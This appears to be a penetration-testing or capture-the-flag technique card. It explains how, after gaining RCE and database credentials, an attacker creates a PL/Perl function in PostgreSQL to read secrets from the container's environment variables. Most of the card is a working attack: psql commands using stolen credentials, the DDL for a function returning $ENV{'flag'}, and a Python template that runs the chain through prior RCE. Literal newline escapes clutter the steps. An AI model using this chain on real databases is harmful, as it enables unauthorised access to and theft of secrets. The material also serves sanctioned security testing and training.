---
name: postgresql_plperlu_env_var_flag_read
vuln_type: information_disclosure
sub_technique: db_env_leak
category: exploitation
safety_level: safe
---

# Postgresql Pl/Perl(U) Function Reads Container Environment Variables Containing Secrets

## When to Apply

A PostgreSQL database has the `plperl` or `plperlu` (PL/Perl Untrusted) language extension installed, and the connected database user has CREATE permission on at least one schema. Secrets such as flags or API keys are stored as environment variables on the database container (e.g., set via Docker ENV directive). The attacker has obtained database credentials (e.g., from a .env file read via prior RCE) and can execute DDL statements. PL/Perl functions can access the `$ENV{}` hash to read process environment variables, allowing exfiltration of secrets that are not stored in any database table.

## Prerequisites

- plperl or plperlu extension installed in PostgreSQL
- Database user has CREATE privilege on a schema
- Secrets stored as environment variables on the DB container
- Attacker has DB credentials (from .env file read, SQLi extraction, etc.)
- Network access to PostgreSQL port from compromised service or directly

## Steps

1. Obtain DB credentials (e.g., via RCE → read .env → DATABASE_URL)\n2. Connect to PostgreSQL using the extracted credentials\n   `PGPASSWORD=<pass> psql -h db -U db_user -d resume_db`\n3. Create a schema owned by the connected user (if needed):\n   `CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user;`\n4. Create a PL/Perl function that reads environment variables:\n   ```\n   CREATE OR REPLACE FUNCTION db_user.get_flag()\n   RETURNS text AS $$\n       return $ENV{'flag'};\n   $$ LANGUAGE plperl;\n   ```\n5. Execute the function to retrieve the secret:\n   `SELECT db_user.get_flag();`

## Code Template

```
import subprocess\n# Via RCE on the API server, connect to DB and read flag\ncmd = (\n    'PGPASSWORD=<db_password> psql -h db -U db_user -d resume_db -c "'\n    'CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user; '\n    'CREATE OR REPLACE FUNCTION db_user.get_flag() '\n    'RETURNS text AS \$\$return \\\$ENV{\"flag\"}; \$\$ LANGUAGE plperl; '\n    'SELECT db_user.get_flag();"'\n)\n# Execute via prior RCE (child_process.execSync)
```

## Examples

### Example 1

- **db_engine**: PostgreSQL 15.8 (custom build from source)
- **extensions**: plperl (trusted) + plperlu (untrusted) — both installed
- **env_var**: flag (set via Docker ENV directive in db Dockerfile)
- **user_privilege**: db_user with GRANT ALL on public schema + CREATE on database
- **access_method**: Via RCE on API server → psql to internal db host

The distinction between plperl (trusted) and plperlu (untrusted) is important: standard PostgreSQL plperl restricts access to $ENV{} and other dangerous Perl features, while plperlu allows unrestricted Perl execution including file I/O and environment access. However, custom PostgreSQL builds may have relaxed these restrictions. The key insight is that secrets stored as container environment variables can be read by any language extension that has access to the process environment, even if the secrets are not in any database table.
